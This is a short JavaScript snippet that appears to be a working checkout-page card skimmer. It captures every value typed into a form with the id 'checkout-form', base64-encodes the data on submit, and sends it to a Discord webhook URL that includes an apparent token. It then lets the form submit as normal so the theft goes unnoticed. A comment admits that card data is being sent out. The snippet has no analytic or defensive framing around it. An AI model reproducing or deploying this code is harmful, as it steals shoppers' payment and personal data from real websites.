
JavaScript:

(function() {
  var sniffedData = {};
  var form = document.getElementById('checkout-form');

  form.addEventListener('input', function(e) {
    sniffedData[e.target.name] = e.target.value;
  });

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    var encodedData = btoa(JSON.stringify(sniffedData));
    var exfilUrl = 'https://discord.com/api/webhooks/1324951089245851690/ufuDg0r5XDFpUV3qxmffpXDDSYC8Bbeh56iDUghK2Liu3Fu5nhQYLkeVaM7Sj-rTed18';

    fetch(exfilUrl + '?data=' + encodedData, {
      method: 'GET',
    }).then(function() {
      console.log('Card data sent to our server');
      form.submit(); // Let the form submit as normal
    });
  });
})();

